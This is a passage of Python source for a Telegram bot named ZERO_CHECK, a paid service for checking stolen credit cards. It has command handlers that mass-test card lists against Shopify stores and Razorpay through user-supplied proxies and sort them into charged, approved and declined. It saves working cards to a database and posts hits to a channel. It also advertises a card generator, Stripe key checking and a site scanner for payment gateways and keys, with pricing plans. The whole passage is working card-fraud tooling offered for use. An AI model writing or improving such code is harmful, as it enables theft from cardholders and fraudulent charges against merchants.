            await f.write(f"{'='*49}\nZERO_CHECK RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
            if hits:
                await f.write(f"\n{'='*49}\nHITS\n{'='*49}\n\n")
                for h in hits: await f.write(h+"\n")
        try: await styled_send(target, f"{PE} <b>{bs('Results')}</b> {PE}", emoji_ids=[CE["fire"],CE["fire"]], file=fn)
        except: pass
        try: os.remove(fn)
        except: pass
    except: pass

# ─── Callback handlers ────────────────────────────────────────────────────
@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid); await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""", emoji_ids=[CE["fire"],CE["fire"],CE["info"]])
    else: await event.answer(f"❌ {bs('Not joined')}!", alert=True)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id); await event.answer()
    txt = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items(): txt += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    txt += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, txt, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/SUPERGREMLIN01")]], emoji_ids=[CE["fire"],CE["fire"],CE["crown"]])

@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode(); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}; await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator()); sites, proxies = data["sites"], data["proxies"]
    async def shopify_check(card, http_session):
        res, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid,{}).get("stopped",True), http_session=http_session); return res
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref=="yes", ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks",[]):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_cb(event):
    pref = event.pattern_match.group(1).decode(); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mrz_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MRZ_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}; await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid,{}).get("stopped",True), http_session=http_session)
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref=="yes", ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))

@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MRZ_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks",[]):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode()); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True; await event.answer(f"{bs('Testing sites')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data["exists"], max_price))

@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode()); uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))

@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text(); msg = event.message if hasattr(event,'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except: pass

# ─── Main menu & bot13 style callbacks ──────────────────────────────────
def get_main_menu_keyboard(user_id=None):
    buttons = [
        [inline_btn(f"{bs('Gates')}", b"gates_menu", style="success", icon="🔓"),
         inline_btn(f"{bs('Proxy Setup')}", b"proxy_menu", style="primary", icon="🔌")],
        [inline_btn(f"{bs('Plans')}", b"plans_pricing", style="success", icon="💎"),
         inline_btn(f"{bs('Tools')}", b"tools_menu", style="primary", icon="🛠️")],
        [Button.url(f"{bs('Support')}", "https://t.me/SUPERGREMLIN01"),
         inline_btn(f"{bs('Close')}", b"close_menu", style="danger", icon="❌")],
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([inline_btn(f"{bs('Admin Panel')}", b"admin_panel", style="success", icon="👑")])
    return buttons

@client.on(events.CallbackQuery(data=b"gates_menu"))
async def gates_menu(event):
    await event.answer("🔓 Opening Gates menu")
    text = pe(f"""📋 {bs('User Commands')}

🛒 {bs('Shopify Gates')}
└─ /sh card|mm|yy|cvv → {bs('Single card')}
└─ /msh → {bs('Mass check from .txt file')}

🔴 {bs('Razorpay Gates')}
└─ /rz card|mm|yy|cvv → {bs('Single card')}
└─ /mrz → {bs('Mass check from .txt file')}

🔑 {bs('Key System')}
└─ /redeem KEY → {bs('Redeem a premium key')}

📊 {bs('Ranking')}
└─ /rank → {bs('Top 10 charged users')}

📢 {bs('Forward Media')}
└─ /fb (reply to media) → {bs('Forward to all groups')}""")
    await event.edit(text, buttons=[[inline_btn(bs("🔙 Back"), b"main_menu", style="danger", icon="🔙")]], parse_mode='html')

@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def proxy_menu(event):
    await event.answer("🔌 Opening Proxy Management")
    if not await is_premium_user(event.sender_id):
        return await event.answer(pe(f"❌ {bs('Only premium users can manage proxies.')}"), alert=True)
    text = pe(f"""🔌 {bs('Proxy Management (Your Own)')}

📥 {bs('Add Proxies')}
└─ /addproxy → {bs('Add your own proxies (one per line)')}

🔄 {bs('Check Proxies')}
├─ /proxy → {bs('Check all your proxies (remove dead)')}
└─ /chkproxy → {bs('Check a single proxy')}

❌ {bs('Remove Proxies')}
├─ /rmproxy → {bs('Remove a specific proxy')}
├─ /rmproxyindex → {bs('Remove by index (e.g., 1,2,3)')}
└─ /clearproxy → {bs('Remove all your proxies')}

📂 {bs('View & Download')}
├─ /myproxy → {bs('View your own proxies')}
└─ /getproxy → {bs('Download your proxy list')}""")
    await event.edit(text, buttons=[[inline_btn(bs("🔙 Back"), b"main_menu", style="danger", icon="🔙")]], parse_mode='html')

@client.on(events.CallbackQuery(data=b"plans_pricing"))
async def plans_pricing(event):
    await event.answer("💰 Opening Plans & Pricing")
    text = pe(f"""<b>{PE} {bs('Plans & Pricing')}</b>

<b>{bs('Access')}</b> 💎
{SEP}
⏱️ <b>{bs('Span')}</b> ━ 7 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $10

<b>{bs('Elite')}</b> 💎
{SEP}
⏱️ <b>{bs('Span')}</b> ━ 15 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $15

<b>{bs('Access')}</b> 💎
{SEP}
⏱️ <b>{bs('Span')}</b> ━ 30 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $30

{SEP}
💡 {bs('Contact @SUPERGREMLIN01 to upgrade.')}""")
    await event.edit(text, buttons=[[Button.url(bs("📩 Contact Admin"), "https://t.me/SUPERGREMLIN01")],[inline_btn(bs("🔙 Back"), b"main_menu", style="danger", icon="🔙")]], parse_mode='html')

@client.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu(event):
    await event.answer("🛠️ Opening Tools")
    text = pe(f"""🛠️ {bs('Tools Menu')}

🔍 {bs('BIN Lookup')}
└─ /bin <BIN> → {bs('Get card BIN info')}

🔑 {bs('Stripe Key Check')}
└─ /sk <key> → {bs('Check Stripe key validity')}

🌐 {bs('Site Scanner')}
└─ /scg <URL> → {bs('Scan site for gateways, keys, CMS')}

💳 {bs('Card Generator')}
└─ /gen <BIN> [count] → {bs('Generate cards')}

📁 {bs('File Tools')}
├─ /split → {bs('Split card file into parts')}
├─ /merge → {bs('Merge multiple files')}
├─ /collect → {bs('Collect cards from messages')}
└─ /clean → {bs('Remove expired cards')}""")
    await event.edit(text, buttons=[[inline_btn(bs("🔙 Back"), b"main_menu", style="danger", icon="🔙")]], parse_mode='html')

@client.on(events.CallbackQuery(data=b"support_menu"))
async def support(event):
    await event.answer("🛡️ Opening Support")
    text = pe(f"""🛡️ {bs('Support')}

{bs('For help, contact our support team:')}
👤 {OWNER_NAME}
📩 {OWNER_USERNAME}

{bs('Or join our group:')} {JOIN_GROUP_LINK}""")
    await event.edit(text, buttons=[[inline_btn(bs("🔙 Back"), b"main_menu", style="danger", icon="🔙")]], parse_mode='html')

@client.on(events.CallbackQuery(data=b"close_menu"))
async def close_menu(event):
    await event.answer("Closing menu"); await event.delete()

@client.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    await event.answer("🔙 Returning to main menu")
    user_id = event.sender_id; plan = await get_user_plan(user_id)
    try:
        sender = await event.get_sender(); username = sender.username if sender.username else "User"
    except: username = "User"
    if is_paid_plan(plan):
        status_text = f"{PE} {bs('Premium')}"; limit_text = bs("Unlimited")
    else:
        status_text = f"{PE} {bs('No Access')}"; limit_text = "N/A cards/file"
    welcome = pe(f"""{SEP}
    ✨ {bs('Welcome to ZERO_CHECK')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{user_id}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")
    try: await event.edit(welcome, buttons=get_main_menu_keyboard(user_id), parse_mode='html')
    except: await client.send_message(user_id, welcome, buttons=get_main_menu_keyboard(user_id), parse_mode='html')

@client.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    await event.answer("👑 Opening Admin Panel")
    if event.sender_id not in ADMIN_ID: return await event.answer(pe(f"❌ {bs('Access Denied. Admin only.')}"), alert=True)
    admin_text = pe(f"""👑 {bs('Admin Panel')}

📋 {bs('Premium Management')}
└─ /addpremium user_id days → {bs('Add user with duration')}
└─ /removepremium user_id → {bs('Remove premium')}
└─ /listpremium → {bs('List all premium users')}
└─ /genkeys amount hours user_limit [price] → {bs('Generate premium keys')}

🌐 {bs('Shopify Sites Management')}
└─ /addsites → {bs('Reply to .txt file to upload Shopify sites')}
└─ /site → {bs('Check & remove dead Shopify sites')}
└─ /rm site → {bs('Remove a specific site')}
└─ /getsites → {bs('Download current sites.txt')}
└─ /setthreshold value → {bs('Set price threshold (e.g., 20)')}
└─ /getthreshold → {bs('Show current threshold')}

🔧 {bs('Price Filters')}
└─ /setfilter shopify_global min-max "Name" → {bs('Add price filter')}
└─ /listfilters → {bs('View all filters')}
└─ /removefilter gateway number → {bs('Remove a filter')}

📊 {bs('Bot Statistics')}
└─ /stats → {bs('Show bot stats')}

🔘 {bs('Bot Control (Owner only)')}
└─ /toggle → {bs('Enable/disable bot')} 👑
└─ /ping → {bs('Check bot response time')}
└─ /addadmin user_id → {bs('Add admin')} 👑
└─ /removeadmin user_id → {bs('Remove admin')} 👑

🎬 {bs('Video Management')}
└─ /setwelcomevideo (reply to video) → {bs('Set welcome video')}
└─ /addhitvideo (reply to video) → {bs('Add a hit video')}
└─ /removehitvideo <index> → {bs('Remove hit video by index')}
└─ /listhitvideos → {bs('List all hit videos')}

📢 {bs('Broadcast')}
└─ /all message → {bs('Send message to all users')}
└─ /fb → {bs('Forward media to all groups')}""")
    await event.edit(admin_text, buttons=[[inline_btn(bs("🔙 Back"), b"main_menu", style="danger", icon="🔙")]], parse_mode='html')

# ─── /start ────────────────────────────────────────────────────────────────
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start_cmd(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        try:
            sender = await event.get_sender(); username = sender.username if sender.username else "User"
        except: username = "User"
        if is_paid_plan(plan): status_text = f"{PE} {bs('Premium')}"; limit_text = bs("Unlimited")
        else: status_text = f"{PE} {bs('No Access')}"; limit_text = "N/A cards/file"
        promo = f"""{PE} <b>{bs('Zero Errors, Guaranteed')}</b> {PE}
{SEP}
😵 <b>{bs('100% Accurate Results')}</b> – {bs('No False Charged, just real Responses.')}
👁 <b>{bs('Fully Private Checking')}</b> – {bs('Your data stays yours, always.')}
🔵 <b>{bs('Budget-Friendly Plans')}</b> – {bs('Premium quality with low plan price.')}
🚀 <b>{bs('Smooth, Clean & Professional Output')}</b> – {bs('Easy to read, easy to use.')}
🔄 <b>{bs('Improving With Every Update')}</b> – {bs('Making Bot Better Everyday.')}
{SEP}"""
        welcome = pe(f"""{promo}

{SEP}
    ✨ {bs('Welcome to ZERO_CHECK')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{event.sender_id}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")
        buttons = get_main_menu_keyboard(event.sender_id)
        wv = get_welcome_video_path()
        if os.path.exists(wv):
            await client.send_file(event.chat.id, file=wv, caption=welcome, buttons=buttons, parse_mode='html', supports_streaming=True)
        else:
            await styled_reply(event, welcome, buttons=buttons, emoji_ids=[CE["fire"],CE["star"],CE["info"],CE["crown"],CE["chart"],CE["check"]])
    except Exception as e: log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")

# ─── /help ─────────────────────────────────────────────────────────────────
@client.on(events.NewMessage(pattern=r'(?i)^[/.]help$'))
async def help_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    help_text = pe(f"""
<b>🤖 ZERO_CHECK – Command List</b>

<b>🛒 Shopify</b>
/sh card|mm|yy|cvv  – {bs('Check a single card')}
/msh               – {bs('Mass check (reply to .txt)')}

<b>🔴 Razorpay</b>
/rz card|mm|yy|cvv – {bs('Single card check')}
/mrz               – {bs('Mass check (reply to .txt)')}

<b>🔌 Proxy</b>
/addproxy, /proxy, /chkproxy, /rmproxy, /rmproxyindex, /clearproxy, /myproxy, /getproxy

<b>🌐 Sites</b>
/addsites, /site, /rm, /getsites, /setthreshold, /getthreshold

<b>🛠️ Tools</b>
/bin, /sk, /scg, /gen, /fake, /ip, /iban

<b>📁 File Tools</b>
/split, /merge, /collect, /clean

<b>👑 Admin</b>
/addpremium, /removepremium, /listpremium, /genkeys, /redeem, /stats, /toggle, /ping, /addadmin, /removeadmin, /all, /fb

<b>🎬 Video</b>
/setwelcomevideo, /addhitvideo, /removehitvideo, /listhitvideos, /hitvideo

<b>📊 Ranking</b>
/rank

💡 <i>{bs('Use /cmds for interactive buttons.')}</i>
""")
    promo = f"""{SEP}
{PE} <b>{bs('Zero Errors, Guaranteed')}</b> {PE}
😵 {bs('100% Accurate Results')} – {bs('No False Charged, just real Responses.')}
👁 {bs('Fully Private Checking')} – {bs('Your data stays yours, always.')}
🔵 {bs('Budget-Friendly Plans')} – {bs('Premium quality with low plan price.')}
🚀 {bs('Smooth, Clean & Professional Output')} – {bs('Easy to read, easy to use.')}
🔄 {bs('Improving With Every Update')} – {bs('Making Bot Better Everyday.')}
{SEP}"""
    await styled_reply(event, help_text + promo, emoji_ids=[CE["info"]])

# ─── All command handlers (bot13 names) ─────────────────────────────────
# /sh (Shopify Single)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh_single(event):
    await _single_check(event, "Shopify")

# /msh (Shopify Mass)
@client.on(events.NewMessage(pattern=r'(?i)^[/.](msh|msp)\b'))
async def msh_mass(event):
    await _mass_check(event, "Shopify")

# /rz (Razorpay Single)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz\b'))
async def rz_single(event):
    await _single_check(event, "RazorPay")

# /mrz (Razorpay Mass)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz\b'))
async def mrz_mass(event):
    await _mass_check(event, "RazorPay")

# Generic single check
async def _single_check(event, gateway):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned":
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id; plan = await get_user_plan(uid); is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try:
        sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    if gateway == "Shopify":
        sites = await get_user_sites(uid) if (is_paid_plan(plan) or uid in ADMIN_ID) else await get_global_sites()
        proxies = await get_all_user_proxies(uid)
        if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
        if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies!')} </b><code>/addproxy</code>", emoji_ids=[CE["warn"]])
        rm = await event.get_reply_message() if event.reply_to_msg_id else None
        card = _get_card_from_event(event, rm)
        if not card: return await styled_reply(event, f"{PE} <code>/sh card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
        if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
        lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
        st = time.time(); rotator = SmartRotator()
        try:
            http = await get_user_http_session(uid, "sp")
            async with get_user_sem(uid, "sp"):
                bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
                res, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http)
                bi = await bin_task
            elapsed = round(time.time()-st,2); status = res.get('Status','Declined')
            if status in ["Charged","Approved"]:
                asyncio.create_task(save_card_to_db(card, status.upper(), res.get('Response',''), res.get('Gateway',''), res.get('Price','')))
                if status == "Charged": asyncio.create_task(increment_charge_count(uid))
            msg, eid = format_simple_card_result(status, card, res.get('Gateway','?'), res.get('Response','')[:150], bi, elapsed, extra_field=("Price", res.get('Price','-')) if res.get('Price','-') != '-' else None)
            try: await lm.delete()
            except: pass
            await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
            if status == "Charged": asyncio.create_task(send_channel_hit(res, uid, username, name, "Shopify"))
        except Exception as e:
            try: await lm.delete()
            except: pass
            await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
    else: # RazorPay
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies!')} </b><code>/addproxy</code>", emoji_ids=[CE["warn"]])
        rm = await event.get_reply_message() if event.reply_to_msg_id else None
        card = _get_card_from_event(event, rm)
        if not card: return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
        if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
        lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
        st = time.time()
        try:
            http = await get_user_http_session(uid, "rz")
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            res = await check_rz_with_retry(card, proxies, uid, max_retries=3, http_session=http)
            bi = await bin_task
            elapsed = round(time.time()-st,2); status = res.get('Status','Declined')
            if status in ["Charged","Approved"]:
                asyncio.create_task(save_card_to_db(card, status.upper(), res.get('Response',''), 'RazorPay', '-'))
                if status == "Charged": asyncio.create_task(increment_charge_count(uid))
            msg, eid = format_rz_single_result(status, card, 'RazorPay', res.get('Response','')[:150], bi, elapsed)
            try: await lm.delete()
            except: pass
            await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
            if status == "Charged": asyncio.create_task(send_channel_hit(res, uid, username, name, "RazorPay"))
        except Exception as e:
            try: await lm.delete()
            except: pass
            await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

def _get_card_from_event(event, reply):
    card = None
    if reply and reply.text:
        cc = extract_cc(reply.text)
        if cc: card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc: card = cc[0]
    return card

# Generic mass check
async def _mass_check(event, gateway):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned":
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if gateway == "Shopify":
        if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
        content, from_inline = "", False
        cmd_text = re.sub(r'^[/.](msh|msp)\s*', '', event.raw_text, flags=re.I).strip()
        if cmd_text: content = cmd_text; from_inline = True
        elif event.reply_to_msg_id:
            rm = await event.get_reply_message()
            if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
            if rm.document:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f: content = await f.read()
                    os.remove(fp)
                except: pass
            elif rm.text: content = rm.text
        else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msh</code>", emoji_ids=[CE["info"]])
        sites = await get_user_sites(uid)
        if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/addsites</code>", emoji_ids=[CE["warn"]])
        cards = extract_cc(content)
        if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
        if len(cards) > cl: cards = cards[:cl]
        await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
        proxies = await get_all_user_proxies(uid); rotator = SmartRotator()
        async def shopify_check(card, http_session):
            res, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid,{}).get("stopped",True), http_session=http_session); return res
        if from_inline:
            ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
            asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))
        else:
            kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}")],[pbtn(bs("Only Charged"), f"chk_pref:no:{uid}")]]
            pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
            USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rotator}
    else: # RazorPay
        if uid in ACTIVE_MRZ_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
        content, from_inline = "", False
        cmd_text = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.I).strip()
        if cmd_text: content = cmd_text; from_inline = True
        elif event.reply_to_msg_id:
            rm = await event.get_reply_message()
            if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
            if rm.document:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f: content = await f.read()
                    os.remove(fp)
                except: pass
            elif rm.text: content = rm.text
        else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mrz</code>", emoji_ids=[CE["info"]])
        cards = extract_cc(content)
        if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
        if len(cards) > cl: cards = cards[:cl]
        await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
        proxies = await get_all_user_proxies(uid)
        async def rz_check(card, http_session):
            return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid,{}).get("stopped",True), http_session=http_session)
        if from_inline:
            ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
            asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))
        else:
            kb = [[pbtn(bs("Charged + Approved"), f"mrz_pref:yes:{uid}")],[pbtn(bs("Only Charged"), f"mrz_pref:no:{uid}")]]
            pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
            USER_APPROVED_PREF[f"mrz_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm}

# ─── Proxy commands (bot13 names) ──────────────────────────────────────
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addproxy'))
async def addproxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        t,e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if not is_paid_plan(await get_user_plan(event.sender_id)): return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp,'r',encoding='utf-8') as f: lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm.text: lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, f"{PE} <code>/addproxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id); cc = await get_proxy_count(event.sender_id)
        if cc >= 100: return await styled_reply(event, f"{PE} <b>{bs('Limit 100/100')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}; parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing: parsed.append(pd); existing.add(pd['proxy_url'])
